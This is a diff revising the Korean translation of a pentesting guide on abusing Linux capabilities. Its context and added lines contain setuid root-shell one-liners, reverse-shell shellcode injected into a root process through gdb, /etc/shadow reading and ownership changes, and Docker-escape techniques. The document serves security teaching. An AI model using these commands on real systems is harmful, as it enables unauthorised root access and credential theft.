@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성이 높은 사이버 보안 이벤트이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술 지식을 촉진하는 임무**를 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들이 모이는 뜨거운 만남의 장소입니다.\\
+​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)는 **스페인**에서 가장 관련성이 높은 사이버 보안 이벤트이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술 지식을 촉진하는 임무**를 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들이 모이는 뜨거운 만남의 장소입니다.\\
 
 {% embed url="https://www.rootedcon.com/" %}
 
@@ -29,32 +29,32 @@ Linux capabilities는 **루트 권한을 더 작고 구별된 단위로 나누�
 ### 문제:
 - 일반 사용자는 제한된 권한을 가지고 있어, 루트 접근이 필요한 네트워크 소켓을 여는 작업에 영향을 미칩니다.
 
-### 권한 집합:
+### 권한 세트:
 
 1. **상속된 (CapInh)**:
 - **목적**: 부모 프로세스에서 전달된 권한을 결정합니다.
-- **기능**: 새로운 프로세스가 생성될 때, 이 집합에서 부모로부터 권한을 상속받습니다. 프로세스 생성 간 특정 권한을 유지하는 데 유용합니다.
+- **기능**: 새로운 프로세스가 생성될 때, 이 세트에서 부모로부터 권한을 상속받습니다. 프로세스 생성 간 특정 권한을 유지하는 데 유용합니다.
 - **제한**: 프로세스는 부모가 가지지 않은 권한을 얻을 수 없습니다.
 
 2. **유효한 (CapEff)**:
 - **목적**: 프로세스가 현재 사용하는 실제 권한을 나타냅니다.
-- **기능**: 다양한 작업에 대한 권한을 부여하기 위해 커널이 확인하는 권한 집합입니다. 파일의 경우, 이 집합은 파일의 허용된 권한이 유효한지 여부를 나타내는 플래그가 될 수 있습니다.
-- **의의**: 유효한 집합은 즉각적인 권한 확인에 중요하며, 프로세스가 사용할 수 있는 활성 권한 집합으로 작용합니다.
+- **기능**: 다양한 작업에 대한 권한을 부여하기 위해 커널이 확인하는 권한 세트입니다. 파일의 경우, 이 세트는 파일의 허용된 권한이 유효한지 여부를 나타내는 플래그가 될 수 있습니다.
+- **의의**: 유효한 세트는 즉각적인 권한 확인에 중요하며, 프로세스가 사용할 수 있는 활성 권한 세트로 작용합니다.
 
 3. **허용된 (CapPrm)**:
-- **목적**: 프로세스가 가질 수 있는 최대 권한 집합을 정의합니다.
-- **기능**: 프로세스는 허용된 집합에서 유효한 집합으로 권한을 상승시킬 수 있으며, 해당 권한을 사용할 수 있게 됩니다. 또한 허용된 집합에서 권한을 제거할 수도 있습니다.
+- **목적**: 프로세스가 가질 수 있는 최대 권한 세트를 정의합니다.
+- **기능**: 프로세스는 허용된 세트에서 유효한 세트로 권한을 상승시킬 수 있으며, 해당 권한을 사용할 수 있는 능력을 부여받습니다. 또한 허용된 세트에서 권한을 제거할 수도 있습니다.
 - **경계**: 프로세스가 가질 수 있는 권한의 상한선으로 작용하여, 프로세스가 미리 정의된 권한 범위를 초과하지 않도록 보장합니다.
 
 4. **경계 (CapBnd)**:
-- **목적**: 프로세스가 생애 주기 동안 획득할 수 있는 권한에 한계를 둡니다.
-- **기능**: 프로세스가 상속 가능하거나 허용된 집합에서 특정 권한을 가지고 있더라도, 경계 집합에 포함되지 않으면 해당 권한을 획득할 수 없습니다.
-- **사용 사례**: 이 집합은 프로세스의 권한 상승 가능성을 제한하는 데 특히 유용하며, 추가적인 보안 계층을 추가합니다.
+- **목적**: 프로세스가 생애 동안 획득할 수 있는 권한에 한계를 둡니다.
+- **기능**: 프로세스가 상속 가능하거나 허용된 세트에서 특정 권한을 가지고 있더라도, 경계 세트에 포함되지 않으면 해당 권한을 획득할 수 없습니다.
+- **사용 사례**: 이 세트는 프로세스의 권한 상승 가능성을 제한하는 데 특히 유용하며, 추가적인 보안 계층을 추가합니다.
 
 5. **환경 (CapAmb)**:
-- **목적**: 특정 권한이 `execve` 시스템 호출을 통해 유지될 수 있도록 하여, 일반적으로 프로세스의 권한이 완전히 초기화되는 결과를 초래합니다.
+- **목적**: 일반적으로 프로세스의 권한이 완전히 초기화되는 `execve` 시스템 호출 간에 특정 권한을 유지할 수 있도록 합니다.
 - **기능**: 관련 파일 권한이 없는 비-SUID 프로그램이 특정 권한을 유지할 수 있도록 보장합니다.
-- **제한**: 이 집합의 권한은 상속 가능 및 허용된 집합의 제약을 받으며, 프로세스의 허용된 권한을 초과하지 않도록 보장합니다.
+- **제한**: 이 세트의 권한은 상속 가능 및 허용된 세트의 제약을 받으며, 프로세스의 허용된 권한을 초과하지 않도록 보장합니다.
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -115,7 +115,7 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-그 방법도 효과적이지만, 더 쉽고 다른 방법이 있습니다. 실행 중인 프로세스의 능력을 보려면, **getpcaps** 도구를 사용한 다음 프로세스 ID (PID)를 입력하면 됩니다. 프로세스 ID 목록을 제공할 수도 있습니다.
+그 방법도 효과적이지만, 더 쉽고 다른 방법이 있습니다. 실행 중인 프로세스의 능력을 보려면 **getpcaps** 도구를 사용하고 그 뒤에 프로세스 ID (PID)를 입력하면 됩니다. 프로세스 ID 목록을 제공할 수도 있습니다.
 ```bash
 getpcaps 1234
 ```
@@ -147,8 +147,7 @@ _getpcaps_ 도구는 **capget()** 시스템 호출을 사용하여 특정 스레
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-You can **search binaries with capabilities** using:  
-당신은 **능력을 가진 바이너리 검색**을 사용할 수 있습니다:
+You can **search binaries with capabilities** using:
 ```bash
 getcap -r / 2>/dev/null
 ```
@@ -288,7 +287,7 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-**컴파일된 환경 바이너리에 의해 실행된 bash 내부**에서 **새로운 능력**을 관찰할 수 있습니다(일반 사용자는 "현재" 섹션에 어떤 능력도 가지지 않습니다).
+**컴파일된 환경 바이너리에 의해 실행된 bash** 내부에서 **새로운 능력**을 관찰할 수 있습니다(일반 사용자는 "현재" 섹션에 어떤 능력도 가지지 않습니다).
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
@@ -299,7 +298,7 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 
 ### 능력 인식/능력 무시 이진 파일
 
-**능력 인식 이진 파일은 환경에서 제공하는 새로운 능력을 사용하지 않지만**, **능력 무시 이진 파일은** 이를 거부하지 않기 때문에 사용할 것입니다. 이는 능력을 이진 파일에 부여하는 특별한 환경 내에서 능력 무시 이진 파일을 취약하게 만듭니다.
+**능력 인식 이진 파일은** 환경에서 제공된 새로운 능력을 사용하지 않지만, **능력 무시 이진 파일은** 이를 거부하지 않기 때문에 사용할 것입니다. 이는 능력을 이진 파일에 부여하는 특별한 환경 내에서 능력 무시 이진 파일을 취약하게 만듭니다.
 
 ## 서비스 능력
 
@@ -362,7 +361,8 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:
+**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:  
+`tcpdump`가 **모든 사용자가 패킷을 스니핑할 수 있도록** 필요한 **Capabilities**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
@@ -370,7 +370,7 @@ getcap /usr/sbin/tcpdump
 ```
 ### "빈" 능력의 특별한 경우
 
-[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): 프로그램 파일에 빈 능력 집합을 할당할 수 있으며, 따라서 실행하는 프로세스의 유효 및 저장된 set-user-ID를 0으로 변경하지만 해당 프로세스에 능력을 부여하지 않는 set-user-ID-root 프로그램을 생성할 수 있습니다. 간단히 말해, 다음 조건을 만족하는 바이너리가 있다면:
+[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): 빈 능력 집합을 프로그램 파일에 할당할 수 있으며, 따라서 실행하는 프로세스의 유효 및 저장된 set-user-ID를 0으로 변경하지만 해당 프로세스에 능력을 부여하지 않는 set-user-ID-root 프로그램을 생성할 수 있습니다. 간단히 말해, 다음 조건을 만족하는 바이너리가 있다면:
 
 1. root에 의해 소유되지 않음
 2. `SUID`/`SGID` 비트가 설정되어 있지 않음
@@ -380,7 +380,7 @@ getcap /usr/sbin/tcpdump
 
 ## CAP\_SYS\_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux 능력으로, 장치 마운트 또는 커널 기능 조작과 같은 광범위한 **관리 권한**으로 인해 거의 root 수준에 해당합니다. 전체 시스템을 시뮬레이션하는 컨테이너에 필수적이지만, **`CAP_SYS_ADMIN`은 권한 상승 및 시스템 손상의 가능성으로 인해** 특히 컨테이너화된 환경에서 상당한 보안 문제를 야기합니다. 따라서 이 능력의 사용은 엄격한 보안 평가와 신중한 관리가 필요하며, **최소 권한 원칙**을 준수하고 공격 표면을 최소화하기 위해 애플리케이션 전용 컨테이너에서 이 능력을 제거하는 것이 강력히 권장됩니다.
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux 능력으로, 장치 마운트 또는 커널 기능 조작과 같은 광범위한 **관리 권한**으로 인해 거의 root 수준에 해당합니다. 전체 시스템을 시뮬레이션하는 컨테이너에 필수적이지만, **`CAP_SYS_ADMIN`은 권한 상승 및 시스템 손상의 잠재력으로 인해** 특히 컨테이너화된 환경에서 상당한 보안 문제를 야기합니다. 따라서 이 능력의 사용은 엄격한 보안 평가와 신중한 관리가 필요하며, **최소 권한 원칙**을 준수하고 공격 표면을 최소화하기 위해 애플리케이션 전용 컨테이너에서 이 능력을 제거하는 것이 강력히 권장됩니다.
 
 **바이너리 예제**
 ```bash
@@ -410,7 +410,7 @@ libc.mount(source, target, filesystemtype, mountflags, options)
 
 **환경 예시 (Docker 탈출)**
 
-다음 명령어를 사용하여 도커 컨테이너 내에서 활성화된 능력을 확인할 수 있습니다:
+Docker 컨테이너 내에서 활성화된 능력을 확인하려면 다음을 사용하세요:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -423,7 +423,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Inside the previous output you can see that the SYS\_ADMIN capability is enabled.
+이전 출력에서 SYS\_ADMIN 기능이 활성화되어 있음을 알 수 있습니다.
 
 * **Mount**
 
@@ -458,7 +458,7 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP\_SYS\_PTRACE
 
-**이것은 호스트에서 실행 중인 일부 프로세스에 쉘코드를 주입하여 컨테이너를 탈출할 수 있음을 의미합니다.** 호스트에서 실행 중인 프로세스에 접근하려면 컨테이너를 최소한 **`--pid=host`** 옵션으로 실행해야 합니다.
+**이것은 호스트 내에서 실행 중인 일부 프로세스에 쉘코드를 주입하여 컨테이너에서 탈출할 수 있음을 의미합니다.** 호스트 내에서 실행 중인 프로세스에 접근하려면 컨테이너를 최소한 **`--pid=host`** 옵션으로 실행해야 합니다.
 
 **[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)`가 제공하는 디버깅 및 시스템 호출 추적 기능과 `process_vm_readv(2)`, `process_vm_writev(2)`와 같은 교차 메모리 첨부 호출을 사용할 수 있는 능력을 부여합니다. 진단 및 모니터링 목적으로 강력하지만, `ptrace(2)`에 대한 seccomp 필터와 같은 제한 조치 없이 `CAP_SYS_PTRACE`가 활성화되면 시스템 보안을 심각하게 저해할 수 있습니다. 특히, 이는 seccomp에 의해 부과된 다른 보안 제한을 우회하는 데 악용될 수 있으며, [이와 같은 개념 증명(PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53)에서 입증되었습니다.
 
@@ -581,7 +581,7 @@ buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
 buf += b"\x0f\x05"
 
 # Divisible by 8
-payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+payload = b"\x90" * (-len(buf) % 8) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
@@ -592,32 +592,32 @@ chunks += f"{byte:02x}"
 
 print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
-```markdown
-gdb를 사용하여 루트 프로세스를 디버깅하고 이전에 생성된 gdb 라인을 복사하여 붙여넣습니다:
-```
+루트 프로세스를 gdb로 디버깅하고 이전에 생성된 gdb 라인을 복사하여 붙여넣습니다:
 ```bash
+# Let's write the commands to a file
+echo 'set {long}($rip+0) = 0x296a909090909090
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+c' > commands.gdb
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
 /usr/bin/gdb -p $(pgrep sleep)
 [...]
-(gdb) set {long}($rip+0) = 0x296a909090909090
-(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
-(gdb) set {long}($rip+16) = 0x0002b9489748050f
-(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
-(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
-(gdb) set {long}($rip+40) = 0xceff485e036a050f
-(gdb) set {long}($rip+48) = 0x6af675050f58216a
-(gdb) set {long}($rip+56) = 0x69622fbb4899583b
-(gdb) set {long}($rip+64) = 0x8948530068732f6e
-(gdb) set {long}($rip+72) = 0x050fe689485752e7
-(gdb) c
+(gdb) source commands.gdb
 Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
 **환경 예제 (Docker 탈출) - 또 다른 gdb 남용**
 
-**GDB**가 설치되어 있거나 (`apk add gdb` 또는 `apt install gdb`로 설치할 수 있는 경우) **호스트에서 프로세스를 디버깅**하고 `system` 함수를 호출하게 할 수 있습니다. (이 기술은 `SYS_ADMIN` 권한도 필요합니다)**.**
+만약 **GDB**가 설치되어 있거나 `apk add gdb` 또는 `apt install gdb`와 같은 방법으로 설치할 수 있다면, **호스트에서 프로세스를 디버깅**하고 `system` 함수를 호출하게 할 수 있습니다. (이 기술은 또한 `SYS_ADMIN` 권한이 필요합니다)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
@@ -632,7 +632,7 @@ gdb -p 1234
 
 **환경 예제 (Docker 탈출) - 쉘코드 주입**
 
-다음 명령어를 사용하여 도커 컨테이너 내에서 활성화된 기능을 확인할 수 있습니다:
+다음 명령어를 사용하여 도커 컨테이너 내에서 활성화된 능력을 확인할 수 있습니다:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -655,7 +655,7 @@ List **processes** running in the **host** `ps -eaf`
 
 ## CAP\_SYS\_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 프로세스가 **커널 모듈을 로드하고 언로드할 수 있도록 (`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` 시스템 호출)** 하여 커널의 핵심 작업에 직접 접근할 수 있게 합니다. 이 기능은 커널을 수정할 수 있게 하여 모든 Linux 보안 메커니즘, Linux Security Modules 및 컨테이너 격리를 우회할 수 있으므로 중요한 보안 위험을 초래합니다.  
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 프로세스가 **커널 모듈을 로드하고 언로드할 수 있도록 (`init_module(2)`, `finit_module(2)` 및 `delete_module(2)` 시스템 호출)** 하여 커널의 핵심 작업에 직접 접근할 수 있게 합니다. 이 기능은 커널을 수정할 수 있게 하여 모든 Linux 보안 메커니즘, Linux Security Modules 및 컨테이너 격리를 우회할 수 있기 때문에 중요한 보안 위험을 초래합니다.  
 **이는 호스트 머신의 커널에 커널 모듈을 삽입/제거할 수 있음을 의미합니다.**
 
 **Example with binary**
@@ -665,7 +665,7 @@ List **processes** running in the **host** `ps -eaf`
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-기본적으로, **`modprobe`** 명령은 디렉토리 **`/lib/modules/$(uname -r)`**에서 의존성 목록과 맵 파일을 확인합니다.\
+기본적으로, **`modprobe`** 명령은 **`/lib/modules/$(uname -r)`** 디렉토리에서 의존성 목록과 맵 파일을 확인합니다.\
 이를 악용하기 위해 가짜 **lib/modules** 폴더를 생성해 봅시다:
 ```bash
 mkdir lib/modules -p
@@ -689,11 +689,11 @@ km.modprobe("reverse-shell")
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-어떤 의미에서든 **`insmod`** 명령어를 사용하여 커널 모듈을 삽입할 수 있습니다. 아래 예제를 따라 이 권한을 악용하여 **reverse shell**을 얻으세요.
+어떤 의미냐면, **`insmod`** 명령어를 사용하여 커널 모듈을 삽입할 수 있다는 것입니다. 아래 예제를 따라 이 권한을 악용하여 **reverse shell**을 얻으세요.
 
 **환경 예제 (Docker 탈출)**
 
-docker 컨테이너 내에서 활성화된 능력을 확인하려면 다음을 사용하세요:
+docker 컨테이너 내에서 활성화된 권한을 확인하려면 다음을 사용하세요:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -773,7 +773,7 @@ insmod reverse-shell.ko #Launch the reverse shell
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 프로세스가 **파일 읽기 및 디렉토리 읽기/실행에 대한 권한을 우회할 수 있도록** 합니다. 주된 용도는 파일 검색 또는 읽기 목적입니다. 그러나 이 기능은 프로세스의 마운트 네임스페이스 외부의 파일을 포함하여 모든 파일에 접근할 수 있는 `open_by_handle_at(2)` 함수를 사용할 수 있게 합니다. `open_by_handle_at(2)`에서 사용되는 핸들은 `name_to_handle_at(2)`를 통해 얻은 비투명 식별자여야 하지만, 조작에 취약한 inode 번호와 같은 민감한 정보를 포함할 수 있습니다. 이 기능의 악용 가능성은 특히 Docker 컨테이너의 맥락에서 Sebastian Krahmer에 의해 shocker exploit로 입증되었습니다. [여기서 분석됨](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 는 프로세스가 **파일 읽기 및 디렉토리 읽기/실행에 대한 권한을 우회할 수 있도록** 합니다. 주된 용도는 파일 검색 또는 읽기 목적입니다. 그러나 이 기능은 프로세스의 마운트 네임스페이스 외부에 있는 파일을 포함하여 모든 파일에 접근할 수 있는 `open_by_handle_at(2)` 함수를 사용할 수 있게 합니다. `open_by_handle_at(2)`에서 사용되는 핸들은 `name_to_handle_at(2)`를 통해 얻은 비투명 식별자여야 하지만, 조작에 취약한 inode 번호와 같은 민감한 정보를 포함할 수 있습니다. 이 기능의 악용 가능성, 특히 Docker 컨테이너의 맥락에서,는 Sebastian Krahmer에 의해 shocker exploit로 입증되었습니다. [여기서 분석되었습니다.](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)  
 **이는 파일 읽기 권한 검사 및 디렉토리 읽기/실행 권한 검사를 우회할 수 있음을 의미합니다.**
 
 **바이너리 예시**
@@ -794,13 +794,13 @@ for r, d, f in os.walk('/root'):
 for filename in f:
 print(filename)
 ```
-파일을 읽기 위해서는 다음과 같이 할 수 있습니다:
+파일을 읽기 위해 다음과 같이 할 수 있습니다:
 ```python
 print(open("/etc/shadow", "r").read())
 ```
-**환경 예시 (Docker 탈출)**
+**Example in Environment (Docker breakout)**
 
-docker 컨테이너 내에서 활성화된 능력을 확인하려면 다음을 사용하세요:
+Docker 컨테이너 내에서 활성화된 능력을 확인하려면 다음을 사용하세요:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -815,7 +815,7 @@ groups=0(root)
 ```
 Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.
 
-You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH**는 권한 확인 없이 파일 시스템을 탐색할 수 있을 뿐만 아니라, _**open\_by\_handle\_at(2)**_에 대한 모든 검사를 명시적으로 제거하고 **다른 프로세스에 의해 열린 민감한 파일에 접근할 수 있도록 할 수 있습니다**.
+You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH**는 권한 확인 없이 파일 시스템을 탐색할 수 있을 뿐만 아니라, _**open\_by\_handle\_at(2)**_에 대한 모든 검사를 명시적으로 제거하고 **다른 프로세스에 의해 열린 민감한 파일에 대한 접근을 허용할 수 있습니다**.
 
 The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
 ```c
@@ -968,7 +968,7 @@ return 0;
 }
 ```
 {% hint style="warning" %}
-이 익스플로잇은 호스트에 마운트된 무언가에 대한 포인터를 찾아야 합니다. 원래 익스플로잇은 파일 /.dockerinit을 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. 익스플로잇이 작동하지 않는다면 다른 파일을 설정해야 할 수도 있습니다. 호스트에 마운트된 파일을 찾으려면 mount 명령을 실행하세요:
+이 익스플로잇은 호스트에 마운트된 무언가에 대한 포인터를 찾아야 합니다. 원래의 익스플로잇은 파일 /.dockerinit을 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. 익스플로잇이 작동하지 않는다면 다른 파일을 설정해야 할 수도 있습니다. 호스트에 마운트된 파일을 찾으려면 mount 명령을 실행하세요:
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (407) (1).png>)
@@ -979,7 +979,7 @@ return 0;
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **은 스페인에서 가장 관련성이 높은 사이버 보안 이벤트이며, 유럽에서 가장 중요한 행사 중 하나입니다. 기술 지식을 촉진하는 미션을 가지고 있는 이 컨그레스는 모든 분야의 기술 및 사이버 보안 전문가들이 모이는 뜨거운 만남의 장소입니다.**
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **은 스페인에서 가장 관련성이 높은 사이버 보안 이벤트이며, 유럽에서 가장 중요한 행사 중 하나입니다.** **기술 지식을 촉진하는 임무**를 가지고 있는 이 컨그레스는 모든 분야의 기술 및 사이버 보안 전문가들이 모이는 뜨거운 만남의 장소입니다.
 
 {% embed url="https://www.rootedcon.com/" %}
 
@@ -987,7 +987,7 @@ return 0;
 
 **이는 모든 파일에 대한 쓰기 권한 검사를 우회할 수 있음을 의미하므로, 어떤 파일이든 쓸 수 있습니다.**
 
-특권 상승을 위해 **덮어쓸 수 있는 파일이 많이 있습니다.** [**여기에서 아이디어를 얻을 수 있습니다.**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)
+**권한 상승을 위해 덮어쓸 수 있는 파일이 많이 있으며, [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).**
 
 **바이너리 예제**
 
@@ -1171,7 +1171,7 @@ In order to scape the docker container you could **download** the files `/etc/sh
 
 **바이너리 예시**
 
-**`python`** 바이너리가 이 권한을 가지고 있다고 가정해 보겠습니다. 그러면 **shadow** 파일의 **소유자**를 **변경**하고, **루트 비밀번호**를 **변경**하며, 권한을 상승시킬 수 있습니다:
+**`python`** 바이너리가 이 권한을 가지고 있다고 가정하면, **shadow** 파일의 **소유자**를 **변경**하고, **루트 비밀번호를 변경**하며, 권한을 상승시킬 수 있습니다:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1191,7 +1191,7 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 ### CAP\_SETUID
 
-**이것은 생성된 프로세스의 유효 사용자 ID를 설정할 수 있음을 의미합니다.**
+**이는 생성된 프로세스의 유효 사용자 ID를 설정할 수 있음을 의미합니다.**
 
 **바이너리 예시**
 
@@ -1214,7 +1214,7 @@ os.system("/bin/bash")
 
 **이는 생성된 프로세스의 유효 그룹 ID를 설정할 수 있음을 의미합니다.**
 
-특권을 상승시키기 위해 **덮어쓸 수 있는 파일이 많이 있습니다,** [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+권한을 상승시키기 위해 **덮어쓸 수 있는 파일이 많이 있습니다,** [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **바이너리 예제**
 
@@ -1227,7 +1227,7 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-한 번 권한 상승을 위해 악용할 수 있는 파일을 찾으면 (읽기 또는 쓰기를 통해) **흥미로운 그룹을 가장하여 셸을 얻을 수 있습니다**:
+파일을 찾아서 권한 상승을 위해 악용할 수 있는 경우(읽기 또는 쓰기를 통해) **흥미로운 그룹을 가장하는 셸을 얻을 수 있습니다**:
 ```python
 import os
 os.setgid(42)
@@ -1275,14 +1275,14 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 {% hint style="warning" %}
-새로운 능력을 바이너리에 CAP\_SETFCAP으로 설정하면 이 능력을 잃게 됩니다.
+새로운 능력을 CAP\_SETFCAP으로 바이너리에 설정하면 이 능력을 잃게 됩니다.
 {% endhint %}
 
 SETUID capability를 얻으면 [SETUID capability](linux-capabilities.md#cap\_setuid) 섹션으로 가서 권한 상승 방법을 확인할 수 있습니다.
 
 **환경 예시 (Docker 탈출)**
 
-기본적으로 **CAP\_SETFCAP 능력은 Docker의 컨테이너 내 프로세스에 부여됩니다**. 다음과 같은 방법으로 확인할 수 있습니다:
+기본적으로 **CAP\_SETFCAP 능력은 Docker의 컨테이너 내부 프로세스에 부여됩니다**. 다음과 같은 방법으로 확인할 수 있습니다:
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1295,7 +1295,7 @@ capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
 이 기능은 **이진 파일에 다른 모든 기능을 부여할 수 있게 해줍니다**, 따라서 우리는 이 페이지에 언급된 **다른 기능 탈출을 악용하여** 컨테이너에서 **탈출**하는 것을 생각할 수 있습니다.\
